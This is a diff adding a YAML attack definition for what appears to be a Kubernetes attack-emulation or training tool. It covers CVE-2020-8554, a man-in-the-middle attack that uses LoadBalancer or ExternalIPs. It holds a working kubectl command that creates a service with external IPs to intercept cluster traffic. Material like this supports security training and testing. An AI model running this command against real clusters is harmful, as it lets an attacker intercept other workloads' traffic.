@@ -1,0 +1,36 @@
+name: MITM CVE-2020-8554
+description: CVE-2020-8554 Man in the middle using LoadBalancer or ExternalIPs
+tactic: Privilege Escalation
+techniques: ["Account Manipulation: Additional Container Cluster Roles"]
+parameters:
+  INTERCEPT_IPS:
+    type: list
+    description: the IPs to intercept
+  SVC_NAME:
+    type: string
+    description: the name of the MitM service
+  SVC_TYPE:
+    type: string
+    default: clusterip
+    description: the type of service to create
+  TARGET_LABEL:
+    type: string
+    description: the label selector of the pod to which the traffic will be redirected
+  PORT:
+    type: int
+    default: 80
+    description: the port of service to create
+  # DST_BIN:
+  #   type: string
+  #   description: the destination path of the binary at the remote system
+  #   required: false
+cmdVariants:
+  - key: kubectl
+    command: kubectl create service ${SVC_TYPE} ${SVC_NAME} --external-ip ${INTERCEPT_IPS} --tcp=${PORT} --dry-run=client -o yaml | kubectl apply -f -
+preconditions:
+  accessLevel: "can-create service"
+# cmd: {}
+# defend: {}
+refernces:
+  - https://attack.mitre.org/techniques/T1098/006/
+  - https://github.com/Container-Security-Training/Kubecon-EU-25
